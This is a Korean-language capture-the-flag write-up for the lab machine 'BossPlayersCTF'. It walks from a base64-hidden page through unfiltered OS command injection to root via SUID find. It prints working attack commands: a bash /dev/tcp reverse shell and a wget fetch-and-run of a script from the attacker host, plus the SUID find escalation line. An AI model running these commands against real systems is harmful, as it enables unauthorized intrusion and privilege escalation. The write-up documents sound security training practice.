---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/rce
  - tech/payload/revshell
  - tech/lin/suid
type: machine
platform: pg
os: linux
ip: 192.168.248.20
ports: [22, 80]
services: [http, ssh]
status: solved
manual_tags: true
tech_count: 3
---
# BossPlayersCTF

> [!info] 요약
> 타겟 `192.168.248.20` · 호스트명 `bossplayers` · Debian 10 (buster) · Fundamental · 플래그 2개
> 진입점: 80/Apache index 소스 하단 HTML 주석의 3중 base64 디코드 체인 → 숨은 페이지 `workinginprogress.php` → `?cmd=` 파라미터 무필터 OS 명령 삽입 → `nc` 리버스셸(tcp/443)
> 권한상승: SUID `/usr/bin/find` (GTFOBins) → 즉시 root
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.248.20

### Initial Access – index 소스에 숨은 base64 디코드 체인이 필터 없는 명령 삽입 페이지로 이어짐

**Vulnerability Explanation:**
- `index.html` 하단에 HTML 주석으로 3중 base64 인코딩된 문자열이 숨겨져 있음. `</html>` 뒤 빈 줄 118개로 화면 밖에 위치해 브라우저 렌더로는 안 보이고 소스 보기·`curl` 로만 확인됨
- 디코드하면 숨은 페이지 `workinginprogress.php` 경로가 나옴. 그 페이지의 `cmd` 파라미터가 필터·이스케이프 없이 OS 명령을 그대로 실행 — 명령 출력이 문서 `</html>` 바깥에 그대로 append 됨
- 명령 연결자(`;`/`&&`/`|` 중 하나로 확인 근거는 화면뿐)가 걸러지지 않아 다중 명령 실행 가능

**Vulnerability Fix:**
- 웹 페이지에서 사용자 입력을 OS 명령으로 실행하는 기능 자체를 두지 않을 것. 부득이하면 화이트리스트 인자만 받고 셸 메타문자를 이스케이프
- 인코딩된 문자열이라도 민감해 보이는 정보(내부 페이지 경로)를 프로덕션 페이지 소스에 남기지 말 것

**Severity:** Critical — 무인증 원격 OS 명령 실행

**Steps to reproduce the attack:**
1. `index.html` 소스 하단 HTML 주석에서 base64 문자열 확인
2. base64 디코드를 평문이 나올 때까지 반복 → 3회째에 `workinginprogress.php` 획득
3. `workinginprogress.php` GET → "Test ping command" 미완료 항목으로 커맨드 실행 기능 추정
4. 파라미터 이름 8종(`cmd`/`command`/`exec`/`c`/`query`/`shell`/`code`/`system`)을 배치로 GET 요청, 무파라미터 대조군과 응답 크기·md5 로 diff
5. `cmd` 만 응답 크기가 갈림(325B vs 271B 동일) → `?cmd=id` 로 명령 실행 확정

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.248.20 | TCP: 22, 80 |

recon.sh 가 두 단계(빠른 포트 스캔 → `-sCV`)를 자동으로 돌리고 전체 TCP·UDP 스캔을 tmux 로 백그라운드에 던짐. 그와 별개로 수동 확인용 스캔도 하나 더 실행함(출처 `writeup_notes.txt`: "recon.sh 기동 (tmux bpc-recon) + 수동 nmap 병행").

출처: `~/PG/BossPlayersCTF/nmap-quick-ports.txt` (top-1000 포트 발견, 0.67초)
```text
# Nmap 7.98 scan initiated Fri Aug 21 15:58:59 2026 as: /usr/lib/nmap/nmap --privileged -Pn -n -T4 --min-rate 2000 --max-retries 2 --top-ports 1000 -oN /home/kali/PG/BossPlayersCTF/nmap-quick-ports.txt -oG /home/kali/PG/BossPlayersCTF/nmap-quick-ports.gnmap 192.168.248.20
Nmap scan report for 192.168.248.20
Host is up (0.093s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

출처: `~/PG/BossPlayersCTF/nmap-quick.txt` (발견된 포트에 `-sCV`)
```text
# Nmap 7.98 scan initiated Fri Aug 21 15:59:00 2026 as: /usr/lib/nmap/nmap --privileged -Pn -n -sCV -p 22,80 -oN /home/kali/PG/BossPlayersCTF/nmap-quick.txt 192.168.248.20
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
| ssh-hostkey: 
|   2048 ac:0d:1e:71:40:ef:6e:65:91:95:8d:1c:13:13:8e:3e (RSA)
|   256 24:9e:27:18:df:a4:78:3b:0d:11:8a:92:72:bd:05:8d (ECDSA)
|_  256 26:32:8d:73:89:05:29:43:8e:a1:13:ba:4f:83:53:f8 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

출처: `~/PG/BossPlayersCTF/nmap-manual-quick.txt` (수동 병행 — 443·8080 추가 확인)
```text
# Nmap 7.98 scan initiated Fri Aug 21 15:59:05 2026 as: /usr/lib/nmap/nmap --privileged -Pn -n -T4 --min-rate 3000 -p22,80,443,8080 -sV -oN nmap-manual-quick.txt 192.168.248.20
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 7.9p1 Debian 10 (protocol 2.0)
80/tcp   open   http       Apache httpd 2.4.38 ((Debian))
443/tcp  closed https
8080/tcp closed http-proxy
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
흔한 보조 웹/프록시 포트(443·8080)를 놓치지 않으려는 이중 확인으로 보이나 의도 기록은 없음 — `[가정]`. 둘 다 closed 로 확정.

출처: `~/PG/BossPlayersCTF/nmap-full.txt` (백그라운드, `-p- -A`, 46초)
```text
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
Network Distance: 4 hops
```
전체 65535 포트 스캔에서도 22·80 뿐 — top-1000 결과와 일치. 숨은 고포트 없음.

출처: `~/PG/BossPlayersCTF/nmap-udp-top100.txt`
```text
Warning: 192.168.248.20 giving up on port because retransmission cap hit (1).
Not shown: 90 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
9/udp     closed discard
...
```
100포트 중 10개만 `closed`(ICMP port-unreachable 회신)이고 나머지 90개는 `open|filtered`(무응답이라 열림/필터링 구분 불가). `--max-retries 1` 로 돌린 스캔이라 신뢰도도 낮음 — 이 결과만으로 UDP 서비스 부재를 단정 불가. SNMP 는 별도 확인, 응답 없음.

출처: `~/PG/BossPlayersCTF/svc/snmp-onesixtyone.txt`
```text
Scanning 1 hosts, 5 communities
```
결과 행 없음 — SNMP 무응답.

**버전 근거 — 독립 출처 2개**

출처: `~/PG/BossPlayersCTF/svc/ssh-banner.txt`
```text
SSH-2.0-OpenSSH_7.9p1 Debian-10
```
nmap 결과와 배너가 교차 일치.

출처: `~/PG/BossPlayersCTF/web-80/whatweb.txt`
```text
http://192.168.248.20:80/ [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[192.168.248.20]
```
nmap 배너와 값 일치 — Apache 버전은 두 출처가 같아 신뢰. 프레임워크·CMS 지문은 하나도 안 잡힘, 정적 HTML 로 판단.

**디렉터리 열거**

출처: `~/PG/BossPlayersCTF/gobuster-80.txt` (raft-small-words + `php,txt,html,bak,zip,old` 확장자)
```text
/index.html           (Status: 200) [Size: 575]
/logs.php             (Status: 200) [Size: 34093]
/.                    (Status: 200) [Size: 575]
/robots.txt           (Status: 200) [Size: 53]
```
`web-80/probe-index.txt` 의 개별 프로브 26종(README·CHANGELOG·`.env`·`.git/HEAD`·`wp-login.php` 등) 중 24종이 404, `/robots.txt` 만 200, `/server-status` 는 403 — 흔한 정적 파일 열거는 전량 공전.

`robots.txt` 원문:
```text
super secret password - bG9sIHRyeSBoYXJkZXIgYnJvCg==
```
base64 디코드 결과(`decode_chain.txt` "--- robots b64 ---" 절): `lol try harder bro` — 값 없는 미끼. 스크린샷: ![[PG-BossPlayersCTF-robots.png]]

`/logs.php`(34KB, gobuster 적중)도 열어보면 `logs.php.html` 원문이 커널 dmesg 부팅 로그 덤프 그대로 — 자격증명·경로 정보 없음. 응답 크기가 크다고 우선순위가 높은 것은 아님. 두 항목 다 진입점이 아니었다는 것만 여기서 확정하고, 정찰 일반화는 [[_PLAYBOOK#A-16. 워드리스트 열거가 전부 공전한다]] 로 넘김.

`index.html` 은 본문 `</html>` 뒤에 빈 줄 118개를 깐 뒤 그 끝에 HTML 주석 한 줄을 숨김(출처 `index_raw.txt`, Content-Length 575):
```text
 <!--WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK-->
```
브라우저로 스크롤해서는 안 보이고 소스 보기·`curl` 로만 잡힘. 스크린샷은 렌더된 화면이라 주석이 나타나지 않음: ![[PG-BossPlayersCTF-index.png]]

### Initial Access – workinginprogress.php `?cmd=` RCE

`index.html` 주석 문자열을 base64 로 반복 디코드함. 출처: `decode_chain.txt`, 원본 주석은 `index_raw.txt`:
```text
WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK   ← index 주석 원문
 → base64 -d → ZDI5eWEybHVaMmx1Y0hKdlozSmxjM011Y0dod0NnPT0K     [1]
 → base64 -d → d29ya2luZ2lucHJvZ3Jlc3MucGhwCg==                 [2]
 → base64 -d → workinginprogress.php                            [3]
```
디코드 3회에 평문 도달. `[4]` 는 평문을 base64 로 오해해 푼 결과라 인쇄 불가 바이트가 나오고, `[5]`·`[6]` 은 빈 줄 — 체인이 3단에서 끝났다는 표시. 종료 조건은 층수를 미리 아는 것이 아니라 「의미 있는 평문이 나올 때까지」임.

`workinginprogress.php` 를 GET 하면(`wip_noparam.html`) 시스템 설치 상태를 보여주는 TODO 형식 페이지가 뜸:
```html
<h3>Outstanding:</h3>
<p>Test ping command - [ ]</p>
<p>Fix Privilege Escalation - [ ]</p>
```
스크린샷: ![[PG-BossPlayersCTF-workinginprogress.png]]
"Test ping command" 항목이 미완료로 남아 있는 것이 커맨드 실행 기능이 이 페이지에 붙어 있다는 힌트.

후보 파라미터 이름 8종을 한 번에 쏨(출처 `writeup_notes.txt`: "파라미터 배치 퍼징 8개(cmd command exec c query shell code system) → grep -l 'uid=' 로 param_cmd.html 단독 적중"). 산출물 파일 크기로 결과가 바로 갈림:

| 파일 | 파라미터 | 크기 | 판정 |
|---|---|---|---|
| `param_cmd.html` | `cmd` | 325 B | 적중 |
| `param_c.html`·`param_code.html`·`param_command.html`·`param_exec.html`·`param_query.html`·`param_shell.html`·`param_system.html` | 각각 | 271 B (동일) | 무반응 |
| `wip_noparam.html` | 없음(대조군) | 271 B | 기준값 |

무반응 7종과 대조군 `wip_noparam.html` 은 md5 가 전부 `e90a614e7e94ce1f9eb40e4b43fef152` 로 동일 — 파라미터 이름이 틀리면 무파라미터 응답과 바이트 단위로 같다는 뜻이라 "이 이름은 안 읽힌다"의 확실한 판정 근거.

`diff param_cmd.html param_c.html`:
```text
23d22
< uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
`?cmd=id` 결과가 페이지 `</html>` 바깥, 문서 맨 끝에 그대로 append 됨 — 필터·이스케이프 흔적 없음.

스크린샷 ![[PG-BossPlayersCTF-rce-cmd-id.png]] 은 `param_cmd.html`(=`?cmd=id`)이 아니라 명령 두 개를 이어 붙인 별도 요청의 화면임 — 마지막 줄이 `uid=33(www-data) gid=33(www-data) groups=33(www-data) Linux bossplayers 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64 GNU/Linux` 로 `id` 와 `uname -a` 출력이 이어져 있음. 연결자로 무엇을 썼는지는 요청 원문이 없어 확정 불가(`;`·`&&`·`|` 중 하나) — 명령 연결자가 걸러지지 않는다는 것만 화면으로 확정됨.

`nc` 리스너를 tcp/443 에 올리고 `?cmd=` 로 리버스셸 페이로드를 전달함. 페이로드 본문은 작업 기록에만 남아 있음(출처 `writeup_notes.txt`: "nc -lvnp 443 (tmux bpc-shell) → `bash -c 'bash -i >& /dev/tcp/192.168.45.207/443 0>&1'` … 443 으로 즉시 connect-back 성공").

⚠️ 실제로 쏜 HTTP 요청의 URL 인코딩 형태는 어느 산출물에도 없음 — 관측 없음. 응답을 파일로 떨어뜨렸을 뿐 요청 원문은 저장하지 않았음. 확정 증거는 아래 세션 캡처뿐임.

출처: `~/PG/BossPlayersCTF/shell443.log`(1~10행 전량)
```bash
listening on [any] 443 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.20] 55784
bash: cannot set terminal process group (649): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bossplayers:/var/www/html$ <r(110)+chr(47)+chr(98)+chr(97)+chr(115)+chr(104)])"
www-data@bossplayers:/var/www/html$ export TERM=xterm; stty rows 50 cols 200
www-data@bossplayers:/var/www/html$ id; tty; hostname
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/dev/pts/0
bossplayers
```
5행의 잘린 문자열이 pty 승격 명령의 에코임. tmux 로 뜬 세션 캡처(`session_bpc-shell.txt` 5~6행)에는 전체 형태가 남아 있음:
```text
python3 -c "import pty;pty.spawn([chr(47)+chr(98)+chr(105)+chr(110)+chr(47)+chr(
98)+chr(97)+chr(115)+chr(104)])"
```
`chr()` 조립은 `/bin/bash` 문자열을 따옴표 없이 만들기 위한 것임(`47 98 105 110 47 98 97 115 104` = `/bin/bash`). 이미 큰따옴표로 감싼 `-c` 인자 안에서 작은따옴표까지 쓰면 중첩 따옴표가 씹히는 경우가 있어 우회한 것 — 문자열 리터럴이 통하는 환경이면 `pty.spawn("/bin/bash")` 로 충분함. 인터프리터는 `python3` 을 실제로 친 것이 확정임(`Privilege Escalation` 절의 `which` 결과와 어긋나 보이는 이유는 그 항목 참고).

`tty` 출력이 `/dev/pts/0` 로 바뀌고 프롬프트가 `www-data@bossplayers:/var/www/html$` 로 뜬 것이 대화형 pty 획득의 증거 — 이후 플래그를 여기서 읽었으므로 웹셸 판정(시험 0점)에 걸리지 않음.

**수동 대안(재현용 템플릿 — 이 박스에서 캡처된 요청 원문은 아님)**
```sh
for p in cmd command exec c query shell code system; do
  curl -s "http://$T/workinginprogress.php?$p=id" -o "param_$p.html"
done
curl -s "http://$T/workinginprogress.php" -o wip_noparam.html   # 대조군을 반드시 같이
md5sum param_*.html wip_noparam.html    # 갈리는 하나가 정답
```

**Local.txt value:**

출처: `~/PG/BossPlayersCTF/shell443.log`(11~17행. 같은 캡처가 `proof_user.txt` 에도 있으나 프롬프트가 붙은 형태는 이쪽)
```bash
www-data@bossplayers:/var/www/html$ whoami; id; hostname; hostname -I; date; cat /home/local.txt
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bossplayers
192.168.248.20 
Fri Aug 21 17:01:06 AEST 2026
70d307a8623905cf272ddd4e5b9931ab
```
`70d307a8623905cf272ddd4e5b9931ab`

### Privilege Escalation – SUID `find`

**Vulnerability Explanation:**
- `/usr/bin/find` 에 SUID 비트(소유자 root)가 설정돼 있음. `find` 의 `-exec` 는 자식 프로세스를 `find` 자신의 자격증명으로 띄우므로, `find` 가 SUID root 이면 그 자식도 euid 0 을 물려받음
- `find` 자체에 취약점이 있어서가 아니라 정상 기능이 SUID 비트와 겹쳐 성립하는 권한상승 경로
- `/usr/bin/grep` 도 같은 조건(SUID root)이나 이 박스에서는 `find` 만으로 충분해 사용하지 않음

**Vulnerability Fix:**
- `find`·`grep` 에 SUID 비트를 줄 이유가 없음 — 둘 다 `-exec`/`--` 옵션 등으로 임의 명령을 실행할 수 있어 SUID 부여 시 즉시 root 획득 경로가 됨. `chmod u-s /usr/bin/find /usr/bin/grep` 로 제거

**Severity:** Critical — 권한상승 없는 www-data 셸에서 SUID 바이너리 하나로 즉시 root

**Steps to reproduce the attack:**
1. 셸 획득 직후 harvest 스크립트로 SUID 목록 전량 회수
2. 배포판 기본 SUID 목록과 대조해 비정상 항목(`find`·`grep`) 식별
3. `ls -la` 로 SUID·SGID 비트와 소유자 재확인
4. `find . -maxdepth 0 -exec /bin/bash -p \; -quit` 실행 → euid=0

**셸 획득 직후 harvest 전송 — `curl` 부재로 실패 후 `wget` 우회**

출처: `~/PG/BossPlayersCTF/shell443.log`(18~28행)
```bash
www-data@bossplayers:/var/www/html$ cd /tmp && curl -s -o h.sh http://192.168.45.207:8000/harvest.sh && sh h.sh > /tmp/harvest_www.txt 2>&1; wc -l /tmp/harvest_www.txt
bash: curl: command not found
wc: /tmp/harvest_www.txt: No such file or directory
www-data@bossplayers:/tmp$ wget -q -O h.sh http://192.168.45.207:8000/harvest.sh; sh h.sh > /tmp/harvest_www.txt 2>&1; wc -l /tmp/harvest_www.txt
2 /tmp/harvest_www.txt
www-data@bossplayers:/tmp$ cat /tmp/harvest_www.txt; ls -la /tmp/h.sh; which wget curl python
수집 완료: /tmp/.h/harvest.txt
831 /tmp/.h/harvest.txt
-rw-r--r-- 1 www-data www-data 3055 Aug 20 19:27 /tmp/h.sh
/usr/bin/wget
/usr/bin/python
```
`which wget curl python` 이 `curl` 행을 아예 반환하지 않은 것이 부재 확정. `/usr/bin/python` 은 존재.

⚠️ `Initial Access` 상세 절의 pty 승격은 `python3` 으로 했는데 여기서는 `python` 만 보이는 것이 모순처럼 보이나 아님 — `which` 질의 목록에 `python3` 를 넣지 않았을 뿐임. pty 승격이 실제로 성공했으므로(`tty` → `/dev/pts/0`) `python3` 도 존재함. 즉 이 박스에는 `python`·`python3` 이 둘 다 있고 `curl` 만 없음. `which` 결과의 부재를 "설치 안 됨"으로 읽기 전에 질의 목록에 넣었는가부터 볼 것.

`harvest_www-data.txt` 에 기록된 SUID 목록(전량):
```text
===== SUDO =====
(sudo 바이너리 없음 — PwnLab 류. 이 반사는 접어라)

===== SUID =====
/usr/bin/mount
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/chsh
/usr/bin/grep
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/find
/usr/bin/newgrp
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
```
SUID 목록을 읽는 법은 긴 목록을 다 보는 것이 아니라 배포판 기본에서 벗어난 항목을 골라내는 것 — 대조 기준은 손에 있는 Debian 계열 머신(Kali). 같은 경로를 `test -u` 로 확인하면 `mount`·`umount`·`gpasswd`·`su`·`chsh`·`chfn`·`passwd`·`fusermount`·`newgrp`·`dbus-daemon-launch-helper`·`ssh-keysign` 11개는 그쪽도 SUID(`dmcrypt-get-device` 는 Kali 에 미설치라 미확인)이고, `find`·`grep` 은 설치돼 있으나 SUID 가 아님. 이 박스에서 비정상인 것은 정확히 그 둘.

`ls -la /usr/bin/find /usr/bin/grep` 로 재확인(`shell443.log` 30~32행):
```bash
www-data@bossplayers:/tmp$ ls -la /usr/bin/find /usr/bin/grep
-rwsr-sr-x 1 root root 315904 Feb 16  2019 /usr/bin/find
-rwsr-sr-x 1 root root 198976 Jan  8  2019 /usr/bin/grep
```
`rws`·`r-s` 로 SUID·SGID 가 둘 다 켜져 있고 소유자가 root.

`sudo` 는 바이너리 자체가 미설치. harvest 스크립트가 `command -v sudo` 로 존재를 먼저 확인하고 없으면 `sudo -l` 을 실행하지 않는 구조라 위 한 줄로 요약된 것 — `sudo -l` 이 권한 없음을 반환한 것과는 다른 상황.

배포판·커널 버전(`harvest_www-data.txt`):
```text
Linux bossplayers 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64 GNU/Linux
PRETTY_NAME="Debian GNU/Linux 10 (buster)"
```

**페이로드 조각별 역할**

| 조각 | 역할 |
|---|---|
| `.` | 탐색 대상. 무엇이든 상관없고 존재하기만 하면 됨 |
| `-maxdepth 0` | `.` 자신만 대상으로 삼아 하위 순회를 막음. 큰 디렉터리에서 `-exec` 가 여러 번 튀는 것을 방지 |
| `-exec /bin/bash -p \;` | 매치 항목마다 셸을 띄움. `\;` 는 셸이 먹지 않게 이스케이프한 `-exec` 종결자 |
| `-p` | 핵심 — bash 는 기본적으로 `euid != uid` 로 시작하면 euid 를 uid 로 떨어뜨림. `-p`(privileged)가 그 강등을 막아 euid 0 을 유지시킴 |
| `-quit` | 첫 실행 뒤 `find` 종료 |

⚠️ GTFOBins 원문은 `find . -exec /bin/sh -p \; -quit` 로 `/bin/sh`(2026-08-21 직접 확인). 여기서는 `/bin/bash` 로 바꿔 씀 — Debian 계열에서 `/bin/sh` 는 dash 심볼릭이고 dash 도 `-p` 를 받으므로(Kali 에서 `dash -p -c` 실행 확인) 양쪽 다 통하되 얻는 셸의 기능이 다름. `-p` 를 빠뜨리면 어느 쪽이든 실패함 — `man bash` INVOCATION 절이 근거: euid 가 실제 uid 와 다르게 시작하면 "the effective user id is set to the real user id", 단 `-p` 가 있으면 "the effective user id is not reset".

출처: `shell443.log`(33~36행)
```bash
www-data@bossplayers:/tmp$ cd /tmp && find . -maxdepth 0 -exec /bin/bash -p \; -quit
bash-5.0# id; whoami
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
root
```
`uid=33` 은 그대로인데 `euid=0` 로 바뀐 것이 SUID 로 얻은 권한임을 보여줌(계정 전환이 아니라 실행 중 특권 상승). 프롬프트가 `bash-5.0#` 로 바뀐 것도 root euid 획득의 방증.

### Post-Exploitation

⚠️ `/root/root.txt` 는 미끼. 내용 전체(`shell443.log` 71~75행. `---` 앞 두 줄은 같은 명령줄에 묶인 harvest 재실행 출력):
```text
bash-5.0# sh /tmp/h.sh > /tmp/harvest_root_out.txt 2>&1; cat /tmp/harvest_root_out.txt; echo ---; cat /root/root.txt
수집 완료: /tmp/.h/harvest.txt
833 /tmp/.h/harvest.txt
---
Your flag is in another file...
```
`ls -la /root` 상으로도 `root.txt` 32바이트 · `proof.txt` 33바이트로 갈림. 이 박스의 진짜 플래그 둘은 모두 32자 hex + 개행 = 33바이트이고 `root.txt` 만 32바이트라, 값을 열어보기 전에 크기만으로도 미끼임이 드러남. 제출 대상은 `/root/proof.txt`.

**Proof.txt value:**

출처: `shell443.log`(64~70행 = `proof_root.txt`)
```text
bash-5.0# whoami; id; hostname; hostname -I; date; cat /root/proof.txt
root
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
bossplayers
192.168.248.20 
Fri Aug 21 17:03:17 AEST 2026
202c3b297263da9f4550d47f62ee3736
```
`202c3b297263da9f4550d47f62ee3736`

`euid=0` 가 찍힌 채로 `whoami` 가 `root` 를 반환하는 화면이라 웹셸이 아니라 SUID 로 승격된 대화형 pty 에서 읽은 것이 판정 근거.

⚠️ 타임존 주의 — 위 `date` 는 타겟 로컬 AEST(UTC+10)이고, Kali 산출물 mtime 은 KST(UTC+9)라 정확히 1시간 어긋남. `harvest_www-data.txt` 의 DATE 절에 `Fri Aug 21 07:01:47 UTC 2026` / `17:01:47 AEST 2026` 가 나란히 찍혀 있어 환산이 확정됨.

**남긴 흔적**
- `/tmp/h.sh`(harvest 스크립트) · `/tmp/.h/harvest.txt`(수집 결과) · `/tmp/harvest_www.txt`·`/tmp/harvest_root_out.txt`(실행 로그) — 원복 대상 아님, 인스턴스 정지로 소멸

**작업 시간**

Kali 산출물 mtime 기준(KST) 정찰 시작 15:58:59 → root 획득(`proof_root.txt`) 16:03:20 — 약 4분 20초.

## 관련

- GTFOBins `find` (https://gtfobins.github.io/gtfobins/find/) — SUID 항목 원문은 `find . -exec /bin/sh -p \; -quit`
- `man bash` INVOCATION — "If the `-p` option is supplied at invocation … the effective user id is not reset"
- [[GLPI]] — 셸 획득 직후 열거에서 곧바로 권한상승 경로가 드러난 사례
- 이 박스의 시행착오·기법 카드 → [[_PLAYBOOK#A-16. 워드리스트 열거가 전부 공전한다]] · [[_PLAYBOOK#B-1-11. 후보 파라미터 이름은 배치로 쏜다 — 대조군 필수]] · [[_PLAYBOOK#B-36. SUID `find` 는 그 자체로 root — `-p` 를 빠뜨리면 실패한다]] · [[_PLAYBOOK#B-83. 타겟에 `curl` 이 없을 수 있다 — 전송 도구부터 확인]] · `D`(시간 배분 표)
